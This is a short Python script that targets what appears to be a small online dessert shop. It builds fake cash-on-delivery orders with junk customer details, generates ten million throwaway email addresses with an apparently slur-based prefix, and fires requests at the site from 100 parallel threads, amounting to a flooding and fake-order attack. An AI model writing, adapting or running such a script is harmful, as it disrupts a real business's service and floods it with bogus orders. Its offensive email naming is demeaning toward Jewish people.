import requests
from concurrent.futures import ThreadPoolExecutor as te
from time import sleep

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": "https://www.gothaalo.com/checkout",
    "Content-Type": "application/json",
    "Origin": "https://www.gothaalo.com",
}

def getPayload(email):
    return {
        "orderId": "CR-956428",
        "customerName": "asf",
        "email": email,
        "phone": "9851426225",
        "address": "asdasd",
        "instructions": "sdasd",
        "items": [
            {
                "id": 1,
                "name": "Coolrouni Kulfi",
                "image": "/coolrouni_kulfi.jpg",
                "price": 80,
                "slug": "coolrouni-kulfi",
                "qty": 50,
            }
        ],
        "total": 4000,
        "paymentMethod": "COD",
        "txId": "",
    }


def do(asd):
    rsp = requests.get('https://gothaalo.vercel.app/', headers=headers).text
    print(rsp)
    return rsp


cases = [f'jew{i}@gmail.com' for i in range(10000000)]

with te(max_workers=100) as executor:

    responses = executor.map(do, cases)